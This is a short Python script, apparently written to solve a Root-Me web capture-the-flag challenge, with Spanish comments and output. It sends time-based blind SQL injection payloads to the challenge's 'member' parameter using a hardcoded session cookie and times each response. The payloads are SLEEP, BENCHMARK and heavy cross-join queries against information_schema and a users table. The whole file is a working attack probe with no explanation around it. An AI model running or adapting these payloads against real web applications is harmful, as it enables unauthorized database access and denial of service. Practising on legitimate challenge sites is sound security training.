import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_timeout(payload):
    """Prueba si el servidor tiene límite de tiempo"""
    params = {"action": "member", "member": payload}
    inicio = time.time()
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        return tiempo, len(r.text)
    except requests.exceptions.Timeout:
        return 30.0, 0
    except:
        return 0, 0

print("="*70)
print("  DETECTANDO LÍMITES DE TIEMPO DEL SERVIDOR")
print("="*70)

# 1. Baseline
t, l = test_timeout("1")
print(f"Baseline: {t:.2f}s, Length: {l}")

# 2. Probar SLEEP con diferentes valores
print("\n[Probando SLEEP con diferentes tiempos]")
for seconds in [1, 2, 3, 5, 10, 20, 30]:
    payload = f"1 AND SLEEP({seconds})"
    t, l = test_timeout(payload)
    print(f"SLEEP({seconds}): {t:.2f}s, Length: {l}")
    time.sleep(0.5)

# 3. Probar BENCHMARK con diferentes valores
print("\n[Probando BENCHMARK con diferentes valores]")
for iterations in [100000, 1000000, 10000000, 50000000]:
    payload = f"1 AND BENCHMARK({iterations}, MD5('x'))"
    t, l = test_timeout(payload)
    print(f"BENCHMARK({iterations}): {t:.2f}s, Length: {l}")
    time.sleep(0.5)

# 4. Probar heavy queries con diferentes niveles
print("\n[Probando heavy queries con diferentes niveles]")
heavy_queries = [
    "(SELECT COUNT(*) FROM information_schema.columns)",
    "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1)",
    "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2)",
    "(SELECT COUNT(*) FROM users, users T1)",
    "(SELECT COUNT(*) FROM users, users T1, users T2)",
    "(SELECT COUNT(*) FROM users, users T1, users T2, users T3)",
]

for heavy in heavy_queries:
    payload = f"1 AND {heavy}"
    t, l = test_timeout(payload)
    print(f"{heavy[:50]}: {t:.2f}s, Length: {l}")
    time.sleep(0.5)
